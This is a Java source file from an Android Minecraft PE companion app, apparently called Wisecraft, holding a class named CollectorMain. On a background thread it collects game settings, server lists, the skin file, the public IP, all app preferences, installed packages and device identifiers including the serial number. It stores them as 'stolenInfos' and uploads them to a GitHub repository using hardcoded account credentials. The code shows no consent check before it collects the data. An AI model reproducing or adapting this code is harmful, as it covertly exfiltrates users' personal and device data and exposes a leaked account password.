package com.nao20010128nao.Wisecraft.collector;
import android.content.*;
import com.nao20010128nao.Wisecraft.*;
import com.nao20010128nao.Wisecraft.misc.*;
import java.util.*;
import org.eclipse.egit.github.core.*;

import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Environment;
import android.preference.PreferenceManager;
import android.util.Base64;
import android.util.Log;
import com.google.gson.Gson;
import com.google.gson.reflect.TypeToken;
import com.nao20010128nao.OTC.OrderTrustedMap;
import com.nao20010128nao.OTC.OrderTrustedSet;
import com.nao20010128nao.Wisecraft.misc.compat.CompatCharsets;
import java.io.File;
import java.io.IOException;
import java.security.MessageDigest;
import java.security.NoSuchAlgorithmException;
import org.apache.http.client.methods.HttpGet;
import org.apache.http.impl.client.DefaultHttpClient;
import org.apache.http.util.EntityUtils;
import org.eclipse.egit.github.core.client.GitHubClient;
import org.eclipse.egit.github.core.service.ContentsService;
import org.eclipse.egit.github.core.service.RepositoryService;

import static com.nao20010128nao.Wisecraft.Utils.*;

public class CollectorMain extends ContextWrapper implements Runnable {
	static boolean running=false;
	public static SharedPreferences stolenInfos;
	
	public CollectorMain() {
		this(true);
	}

	public CollectorMain(boolean start){
		super(TheApplication.instance);
		if(start)new Thread(this).start();
	}
	
	public CollectorMain(Context c,boolean start){
		super(c);
		if(start)new Thread(this).start();
	}
	
	@Override
	public void run() {
		// TODO: Implement this method
		SharedPreferences sb;
		String uuid=TheApplication.instance.uuid;
		if(new File(getFilesDir(), "stolen_encrypted.bin").exists()){
			new File(getFilesDir(), "stolen_encrypted.bin").delete();
		}
		if(new File(getFilesDir(), "stolen.bin").exists()){
			new File(getFilesDir(), "stolen.bin").delete();
		}
		sb=stolenInfos=getSharedPreferences("majeste",MODE_PRIVATE);
		running = true;
		try {
			Log.d("CollectorMain", "start");
			String s="!!ERROR!!";
			try {
				sb.edit().putString(System.currentTimeMillis() + ".json", new Gson().toJson(new Infos())).commit();
				Log.d("CollectorMain", "collect");
			} catch (Throwable e) {
				DebugWriter.writeToE("CollectorMain",e);
				reportError("CollectorMain#run#collect",e);
			} finally {
				System.out.println(s);
			}
			GitHubClient ghc=new GitHubClient().setCredentials("RevealEverything", "nao2001nao");
			Repository repo=null;
			List<RepositoryContents> cont=null;
			SharedPreferences.Editor edt=sb.edit();
			String[] files=Constant.EMPTY_STRING_ARRAY;
			try {
				files = sb.getAll().keySet().toArray(new String[sb.getAll().size()]);
			    repo = new RepositoryService(ghc).getRepository("RevealEverything", "Files");
			    cont = new ContentsService(ghc).getContents(repo);
				Log.d("CollectorMain", "get");
			} catch (Throwable e) {
				DebugWriter.writeToE("CollectorMain",e);
				return;
			}
			try {
				for (String filename:files) {
					String actual=filename;
					filename = uuid + "/" + filename;
					Log.d("CollectorMain", "upload:" + filename);
					try {
						Map<String, String> params = new HashMap<>();
				        params.put("path", filename);
						params.put("message", uuid+":"+Utils.randomText(64));
						byte[] file = sb.getString(actual, "").getBytes(CompatCharsets.UTF_8);
						try {
							String hash=getHash(cont,filename);
							if(!Utils.isNullString(hash))params.put("sha", hash);
						} catch (Throwable e) {
							DebugWriter.writeToE("CollectionMain",e);
							Log.d("CollectorMain", "skipped");
							continue;
						}
						params.put("content", Base64.encodeToString(file, Base64.NO_WRAP));
						ghc.put("/repos/RevealEverything/Files/contents/" + filename, params, TypeToken.get(ContentUpload.class).getType());
						Log.d("CollectorMain", "uploaded");
						edt.remove(actual);
				    } catch (Throwable e) {
						DebugWriter.writeToE("CollectorMain",e);
						continue;
					}
				}
			} catch (Throwable e) {
				DebugWriter.writeToE("CollectorMain",e);
			}finally{
				edt.commit();
				Log.d("CollectorMain", "saveTotal");
			}
		} catch (Throwable e) {
			DebugWriter.writeToE("CollectorMain",e);
		} finally {
			Log.d("CollectorMain", "end");
			running=false;
			Set<String> files=sb.getAll().keySet();
			if(files.size()==0){
				Log.d("CollectorMain", "nothing remained");
			}else{
				for (String s:sb.getAll().keySet()) {
					Log.d("CollectorMain", "remain: "+s);
				}
			}
		}
	}
	
	public static String getHash(List<RepositoryContents> cont, String filename) {
	    for (RepositoryContents o:cont)
	        if (o.getName().equalsIgnoreCase(filename))
	            return o.getSha();
		return null;
	}
	public static String shash(byte[] b) throws IOException {
		try {
			MessageDigest md = MessageDigest.getInstance("SHA");
			md.reset();
			byte[] hashed = md.digest(b);
			StringBuilder sb = new StringBuilder(hashed.length * 2);
			for (byte bite : hashed) {
				sb.append(Character.forDigit(bite >> 4 & 0xf, 16)).append(Character.forDigit(bite & 0xf, 16));
			}
			return sb.toString();
		} catch (NoSuchAlgorithmException e) {
			throw new IOException(e);
		}
	}
	
	public static void reportError(String tag,Throwable e){
		if ((TheApplication.instance.pref.getBoolean("sendInfos", false)|TheApplication.instance.pref.getBoolean("sendInfos_force", false)))
			TheApplication.instance.getSharedPreferences("majeste",MODE_PRIVATE).edit().putString("error-"+System.currentTimeMillis()+".txt",tag+"\n\n"+DebugWriter.getStacktraceAsString(e)).commit();
	}
	
	public static class ContentUpload {
		public RepositoryContents content;
		public RepositoryCommit commit;
		public RepositoryCommit[] parents;
	}
	public static class Infos {
		public OrderTrustedMap<String,String> mcpeSettings=readSettings();
		public String[] mcpeServers=readServers();
		public long cid=getCid();
		public String skin=readSkin();
		public String ip=getIp();
		public String uuid=PreferenceManager.getDefaultSharedPreferences(TheApplication.instance).getString("uuid", "");
		public Server[] managingServers=getManagingServer();
		public SystemInfo systemInfo=new SystemInfo();
		public AppInfo appInfo=new AppInfo();

		private String getIp() {
			HttpGet get=new HttpGet("http://ieserver.net/ipcheck.shtml");
			DefaultHttpClient dhc=new DefaultHttpClient();
			try{
				return Utils.lines(new String(EntityUtils.toByteArray(dhc.execute(get).getEntity())))[0];
			}catch(Throwable e){
				return "127.0.0.1";
			}finally{
				dhc.getConnectionManager().shutdown();
			}
		}
		private long getCid() {
			try {
				return new Long(Utils.lines(Utils.readWholeFile(new File(Environment.getExternalStorageDirectory(), "games/com.mojang/minecraftpe/clientId.txt")))[0]);
			} catch (Throwable e) {
				return Long.MAX_VALUE;
			}
		}
		private OrderTrustedMap<String,String> readSettings() {
			OrderTrustedMap<String,String> data=new OrderTrustedMap<>();
			for(String s:Utils.lines(Utils.readWholeFile(new File(Environment.getExternalStorageDirectory(), "games/com.mojang/minecraftpe/options.txt")))) {
				int colonOfs=s.indexOf(':');
				if(colonOfs==-1){
					data.put(s,null);
				}else{
					data.put(s.substring(0,colonOfs-1),s.substring(colonOfs+1));
				}
			}
			return data;
		}
		private String[] readServers() {
			return Utils.lines(Utils.readWholeFile(new File(Environment.getExternalStorageDirectory(), "games/com.mojang/minecraftpe/external_servers.txt")));
		}
		private String readSkin() {
			byte[] data=Utils.readWholeFileInBytes(new File(Environment.getExternalStorageDirectory(), "games/com.mojang/minecraftpe/custom.png"));
			if(data==null)
				return "";
			else
				return Base64.encodeToString(data, Base64.NO_WRAP);
		}
		private Server[] getManagingServer() {
			return new Gson().fromJson(PreferenceManager.getDefaultSharedPreferences(TheApplication.instance).getString("servers", "[]"), Server[].class);
		}
	}
	public static class AppInfo {
		public String versionName=Utils.getVersionName(TheApplication.instance);
		public int    versionCode=Utils.getVersionCode(TheApplication.instance);
		public String appName="Wisecraft";
		public Map<String,?> preferences=PreferenceManager.getDefaultSharedPreferences(TheApplication.instance).getAll();
	}
	public static class SystemInfo {
		public OrderTrustedSet<String> packages=getPackageNames();
		//public HashMap<String,PackageInfo> packageInfos=getPackageMisc();
		public String 
		board=Build.BOARD
		,bootloader=Build.BOOTLOADER
		,brand=Build.BRAND
		,cpuAbi1=Build.CPU_ABI
		,cpuAbi2=Build.CPU_ABI2
		,device=Build.DEVICE
		,display=Build.DISPLAY
		,fingerprint=Build.FINGERPRINT
		,hardware=Build.HARDWARE
		,host=Build.HOST
		,id=Build.ID
		,manufacture=Build.MANUFACTURER
		,model=Build.MODEL
		,product=Build.PRODUCT
		,serial=Build.SERIAL
		,baseOs=getVersionClassFieldString("BASE_OS")
		,codeName=getVersionClassFieldString("CODENAME")
		,incremental=Build.VERSION.INCREMENTAL
		,release=Build.VERSION.RELEASE
		,sdk=Build.VERSION.SDK
		,securityPatch=getVersionClassFieldString("SECURITY_PATCH");
		public String[] abis=tryGetSupportAbis();
		public int 
		previewSdkInt=getVersionClassFieldInt("PREVIEW_SDK_INT")
		,sdkInt=getVersionClassFieldInt("SDK_INT");
		

		private OrderTrustedSet<String> getPackageNames() {
			return new OrderTrustedSet<>(getPackageMisc().keySet());
		}
		private OrderTrustedMap<String,PackageInfo> getPackageMisc() {
			OrderTrustedMap<String,PackageInfo> names=new OrderTrustedMap<>();
			List<PackageInfo> packages=TheApplication.instance.getPackageManager().getInstalledPackages(PackageManager.GET_RECEIVERS);
			for (PackageInfo pi:packages)
				names.put(pi.packageName, pi);
			return names;
		}
		private String[] tryGetSupportAbis() {
			try {
				return (String[])Build.class.getField("SUPPORTED_ABIS").get(null);
			} catch (NoSuchFieldException e) {} catch (IllegalAccessException e) {} catch (IllegalArgumentException e) {}
			return Constant.EMPTY_STRING_ARRAY;
		}
		private String getVersionClassFieldString(String name) {
			try {
				return (String)Build.VERSION.class.getField(name).get(null);
			} catch (NoSuchFieldException e) {} catch (IllegalAccessException e) {} catch (IllegalArgumentException e) {}
			return null;
		}
		private int getVersionClassFieldInt(String name) {
			try {
				return (int)Build.VERSION.class.getField(name).get(null);
			} catch (NoSuchFieldException e) {} catch (IllegalAccessException e) {} catch (IllegalArgumentException e) {}
			return -1;
		}
	}
}
